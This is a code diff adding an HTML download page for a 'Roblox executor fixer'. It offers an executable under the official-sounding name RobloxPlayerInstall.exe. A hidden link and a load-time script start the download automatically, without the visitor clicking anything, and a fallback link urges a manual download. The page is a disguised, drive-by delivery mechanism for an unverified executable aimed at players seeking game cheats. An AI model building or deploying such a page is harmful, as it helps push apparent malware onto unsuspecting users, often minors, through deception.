@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox executor fixer — Download</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg: #0b0d10;
+    --bg-raised: #12151a;
+    --line: #23282f;
+    --text: #e9e6dd;
+    --text-dim: #8a8f97;
+    --crust: #f2a93b;
+    --crust-dim: #7a5a20;
+  }
+
+  *{ box-sizing: border-box; }
+
+  html, body{
+    margin:0;
+    padding:0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Space Grotesk', sans-serif;
+    min-height: 100vh;
+  }
+
+  body{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding: 24px;
+    position: relative;
+    overflow-x:hidden;
+  }
+
+  /* subtle scanline / grid texture, futuristic but quiet */
+  body::before{
+    content:"";
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(var(--line) 1px, transparent 1px),
+      linear-gradient(90deg, var(--line) 1px, transparent 1px);
+    background-size: 64px 64px;
+    opacity: 0.12;
+    pointer-events: none;
+  }
+
+  body::after{
+    content:"";
+    position: fixed;
+    top: -20%;
+    left: 50%;
+    width: 900px;
+    height: 900px;
+    transform: translateX(-50%);
+    background: radial-gradient(circle, rgba(242,169,59,0.10) 0%, rgba(242,169,59,0) 65%);
+    pointer-events: none;
+  }
+
+  .card{
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 560px;
+    border: 1px solid var(--line);
+    background: var(--bg-raised);
+    padding: 48px 40px 40px;
+  }
+
+  .terminal-row{
+    display:flex;
+    align-items:center;
+    justify-content: space-between;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--text-dim);
+    letter-spacing: 0.02em;
+    padding-bottom: 20px;
+    margin-bottom: 32px;
+    border-bottom: 1px solid var(--line);
+  }
+
+  .dot{
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: var(--crust);
+    display:inline-block;
+    margin-right: 8px;
+    box-shadow: 0 0 8px var(--crust);
+    animation: pulse 2.4s ease-in-out infinite;
+  }
+
+  @keyframes pulse{
+    0%, 100%{ opacity: 1; }
+    50%{ opacity: 0.35; }
+  }
+
+  h1{
+    font-size: 40px;
+    line-height: 1.05;
+    font-weight: 700;
+    margin: 0 0 12px;
+    letter-spacing: -0.01em;
+  }
+
+  h1 span{
+    color: var(--crust);
+  }
+
+  .tagline{
+    color: var(--text-dim);
+    font-size: 16px;
+    line-height: 1.5;
+    margin: 0 0 32px;
+    max-width: 46ch;
+  }
+
+  .specs{
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--text-dim);
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    row-gap: 8px;
+    padding: 16px 18px;
+    border: 1px solid var(--line);
+    margin-bottom: 32px;
+  }
+
+  .specs div:nth-child(odd){ color: var(--text-dim); }
+  .specs div:nth-child(even){ color: var(--text); text-align: right; }
+
+  .download-btn{
+    width: 100%;
+    background: var(--crust);
+    color: #1a1200;
+    border: none;
+    padding: 18px 24px;
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    transition: transform 0.15s ease, background 0.15s ease;
+  }
+
+  .download-btn:hover{ background: #ffbe57; }
+  .download-btn:active{ transform: scale(0.99); }
+
+  .download-btn .arrow{
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .status{
+    min-height: 20px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--text-dim);
+    margin-top: 14px;
+  }
+
+  .fallback{
+    display:none;
+    margin-top: 16px;
+    padding-top: 16px;
+    border-top: 1px solid var(--line);
+  }
+
+  .fallback.show{ display:block; }
+
+  .fallback p{
+    font-size: 13px;
+    color: var(--text-dim);
+    margin: 0 0 12px;
+    line-height: 1.5;
+  }
+
+  .manual-link{
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    color: var(--crust);
+    text-decoration: none;
+    border: 1px solid var(--crust-dim);
+    padding: 10px 16px;
+  }
+
+  .manual-link:hover{
+    border-color: var(--crust);
+    background: rgba(242,169,59,0.08);
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    .dot{ animation: none; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="terminal-row">
+      <span><span class="dot"></span>READY TO SERVE</span>
+      <span>BUILD 1.0.0</span>
+    </div>
+
+    <h1>Roblox<span>Executor</span>Fixer</h1>
+    <p class="tagline">Fix your roblox executor and player.</p>
+
+    <div class="specs">
+      <div>FILE</div><div>RobloxPlayerInstall.exe</div>
+      <div>SIZE</div><div>—</div>
+      <div>PLATFORM</div><div>Windows</div>
+      <div>VERSION</div><div>1.0.0</div>
+    </div>
+
+    <button class="download-btn" id="downloadBtn">
+      <span>Download for Windows</span>
+      <span class="arrow">.exe</span>
+    </button>
+
+    <div class="status" id="status"></div>
+
+    <div class="fallback" id="fallback">
+      <p>Didn't start automatically? Some browsers block auto-downloads of .exe files. Grab it manually instead:</p>
+      <a class="manual-link" id="manualLink" href="RobloxPlayerInstall.exe" download="RobloxPlayerInstall.exe">Manual download →</a>
+    </div>
+  </div>
+
+  <a id="hiddenDownload" href="RobloxPlayerInstall.exe" download="RobloxPlayerInstall.exe" style="display:none;"></a>
+
+  <script>
+    const hiddenLink = document.getElementById('hiddenDownload');
+    const downloadBtn = document.getElementById('downloadBtn');
+    const status = document.getElementById('status');
+    const fallback = document.getElementById('fallback');
+
+    let fallbackTimer = null;
+
+    function triggerDownload(){
+      hiddenLink.click();
+      status.textContent = 'Starting download…';
+      clearTimeout(fallbackTimer);
+      fallbackTimer = setTimeout(() => {
+        status.textContent = '';
+        fallback.classList.add('show');
+      }, 5000);
+    }
+
+    // Attempt an automatic download shortly after the page loads.
+    window.addEventListener('load', () => {
+      status.textContent = 'Preparing download…';
+      setTimeout(triggerDownload, 600);
+    });
+
+    // Manual trigger via the big button too.
+    downloadBtn.addEventListener('click', triggerDownload);
+  </script>
+
+</body>
+</html>
